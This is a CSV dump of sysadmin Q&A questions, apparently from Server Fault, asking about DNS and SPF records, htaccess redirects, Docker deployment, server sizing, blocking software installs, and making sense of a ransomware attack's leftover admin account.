"1019724","Does ""Registry Domain ID"" change on transfer","<p>Can the Registry Domain ID be used to track if a domain still belongs to the same registrant (except for ownership changes) if transferred to a different registrar?  </p>
","<domain-name><whois><domain-transferring>","2020-06-02 16:32:59"
"1019795","SPF DNS void lookup limit exceeded","<p>while testing my DKIM/SPF config by using the port25.com email service, I am getting the following reply for my SPF record:</p>

<p>permerror (DNS void lookup limit exceeded)</p>

<p>However, my spf record does not have any ""include"":</p>

<p>v=spf1 mx a ip4:IP1 ip4:IP2 ip6:IP3 ~all</p>

<p>any idea what is going on?</p>

<p>When I am using <a href=""https://dkimvalidator.com/results"" rel=""nofollow noreferrer"">https://dkimvalidator.com/results</a>, I get a pass on the SPF.</p>

<p>I have checked the docs at <a href=""https://mxtoolbox.com/problem/spf/spf-void-lookups"" rel=""nofollow noreferrer"">https://mxtoolbox.com/problem/spf/spf-void-lookups</a>  and found this here:</p>

<blockquote>
  <p>""The void lookup limit was introduced in RFC 7208 and refers to DNS lookups which either return an empty response (NOERROR with no answers) or an NXDOMAIN response.""</p>
</blockquote>

<p>It's not doing ant DNS lookups, or is it?</p>
","<domain-name-system><email><spf>","2020-06-03 03:59:57"
"1019850","How websites discover subdomains using only 'A' DNS records","<p>Don't 'A' records only return IPv4 addresses?</p>

<p>Why do some websites return subdomains? How do they find those subdomains? I mean, are they doing normal subdomain bruteforcing then resolve each subdomain's A record?</p>

<p>Examples of those websites: DNSDumpster.com => Under 'A' Host Records section</p>

<p>and this one as well <a href=""https://hackertarget.com/find-dns-host-records/"" rel=""nofollow noreferrer"">https://hackertarget.com/find-dns-host-records/</a></p>

<p>For example, when looking for uber.com, it returns the following list of subdomains: 
<a href=""https://i.sstatic.net/0rqxM.png"" rel=""nofollow noreferrer"">Example</a></p>

<p>Does that mean that it tries to match whatever entries having the string uber.com ocurence and returns its corresponding IPv4 address in the DNS server?</p>
","<domain-name-system><domain><subdomain><reverse-dns><domain-name>","2020-06-03 12:51:40"
"1019954","Using AWS lambda or Google Functions to run the a large number of parallel instances of the same script with different arguments","<p>I have a script for collecting data for different social media hashtags. The script currently makes a bunch of sequential HTTP requests, formats the data into a Pandas data frame, and saves it to a csv. For very popular hashtags, it takes hours to run. </p>

<p>I need to run this program for 1000+ individual hashtags. To save time, I'd like to run many instances concurrently, say, 50-100 instances at a time, each collecting different hashtags. </p>

<p>Assuming I change the CSV portion to utilize a cloud storage service instead, what else do I need to do in order to accomplish what I'm describing? If I have a list of all the hashtags I need, how to I set up AWS lambda or Google Functions in order to execute these concurrently, so that 50-100 instances are always running until all the data is collected? </p>
","<amazon-web-services><google-cloud-platform><cloud-computing><amazon-lambda>","2020-06-04 01:47:55"
"809792","Prevent users from installing softwares on workstation irrespective of rights","<p>I am trying to apply below scenario, could you please help me out.</p>

<ol>
<li>In my environment all users are having administrative right on their respective workstation, i am trying to prevent them from installing any software's without knowing me.</li>
<li>If they attempt to install any software there should be pop up message like this :  “Your system administrator has disabled the option to install any software on this computer as per policy” </li>
<li>Users can install only Microsoft and Antivirus updates. </li>
<li>Only specific people can install the SW on machine's.</li>
</ol>

<p>How can i achieve the above points.</p>

<p>Thanks
Avinash Udwant</p>
","<domain><users>","2016-10-18 15:59:32"
"809802","htaccess redirection on specific domain to specific path","<p>i am going to redirect my domain to specific path.</p>

<p>thing that i want is </p>

<pre><code>admin.example.com to admin.example.com/admin
partner.example.com to partner.example.com/partner
</code></pre>

<p>I need this two function in one .htaccess file.
Thanks.</p>
","<apache-2.2><.htaccess><rewrite><httpd>","2016-10-18 16:59:12"
"809817","Advice wanted: Docker Infastructure for the newbie, Flynn, Dokku and Deis or just plain docker?","<p>To give some background we are a development Agency, mostly using Ruby/Rails to develop complex data driven web applications.
These applications usually make use of various services such as a database, caching layer, full text indexing, etc...</p>

<p>We have started to use docker locally for development and want to start deploying with it.</p>

<p>We currently use Puppet, Continues Deployment and all the usual kool aid...</p>

<p>We are looking at rolling out Flynn, Docker or Deis and currently thinking Flynn but I'm wondering if we should bother at all?
Is there a simpler or native docker solution (like swarm) that we are missing?</p>

<p>What we want is the ability to quickly launch applications, if its heroku like than that's a bonus for us but really we are competent enough to be able to manage something that doesn't have all the bells and whistles in favour of something that's easier to manage and roll out long term.</p>

<p>We'll have to repeat this setup over and over and be able to manage it for multiple customers so it needs to be well understood and reliable.
We like simplicity!</p>

<p>So what route would you recommend us to go down?</p>

<p>Thanks very much in advance.</p>

<p>Paul</p>
","<deployment><docker><ruby-on-rails><ruby>","2016-10-18 17:43:03"
"1020281","Is there a ""server"" version of telnet?","<p>If I want to quickly connect to a socket as a client and type something I can use telnet.</p>

<p>Is there a version of telnet or a similar program that provides the server-side of this?</p>

<p>In other words, is there some sort of ""telnetserver"" program I can connect to with telnet and then have a text chat with myself?</p>
","<socket><telnet>","2020-06-06 09:26:31"
"1020427","I need to run multiple processes at once, which server should I use","<p>I bough droplet on DigitalOcean 1GB and 1CPU. I'm running cronjob there. Currently I'm able to run 30 background tasks(processes) at once, once I go up server cannot handle that much.</p>

<p>Those background processes are sending requests to an endpoint, collect a data to array and then send it to another endpoint. Each task process 100 data.</p>

<p>Can you help me choose the right server. I'd like to run at least 100 tasks(processes) in the background at once. Should I buy more RAM or CPU?</p>

<p>Here is current usage, I don't see that server is overloaded with 40 tasks but it can't handle it: 
<a href=""https://i.sstatic.net/KPUYo.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/KPUYo.png"" alt=""enter image description here""></a></p>

<p>What am I doing wrong?</p>
","<memory><cpu-usage><memory-usage>","2020-06-07 20:05:14"
"1020837","terminal shows percent sign at the end of the path","<p>Since today, my terminal shows a percent sign (%) at the end of the path. </p>

<p>what is this and why this happens?</p>

<p>Is it means a special thing?</p>
","<mac><terminal>","2020-06-10 09:46:57"
"1020861","Stop attacker without affecting others on same IP","<p>How can I stop a client that's running a multirequest script on my server that reconnects and continues no matter what,  without affecting the other people/clients that are connected to my server from the same ip as the attacker?</p>

<p>The port is different for each connection so I can't use that</p>
","<security><tcpip><attacks>","2020-06-10 12:52:09"
"1020931","After cyberattack, a new Administrator account has popped up, what, how and for what?","<p>After what seems a human-directed ransomware attack, I am analyzing the system. It is a Windows Server 2016 and I had created the usual Administrator account. Now I see that during the attack, a new ""Administrador.WIN-RSDLE3HIAER"" account has appeared under C:\Users folder. The old plain Administrator still exists but it seems like all files are now under the newly created account (Donwloads, favorites, Desktop, etc... are still in the original account, but empty). It is like the profile was moved to the new Account. </p>

<p>My question, in the search of learning is why is this done, why creating a new account? Is this some kind of self-protection from the attackers? Why is all my original content now under the newly created account? I could still enter ""Administrator"" under the login page and access my profile so this is why I cannot understand the nature of the new account/folder, how I got redirected... in a word... how does this thing work?</p>

<p>Cheers</p>
","<windows><security><windows-server-2012-r2><brute-force-attacks>","2020-06-10 20:38:19"
"1020975","What difference between serverless computing and a virtual machine scale set","<p>What difference between serverless computing and a virtual machine scale set, if the VM is on autoscale? Is there a difference? </p>

<p>I'm very new to this but I can't see the difference. </p>
","<azure><virtual-machines><cloud-computing>","2020-06-11 03:25:13"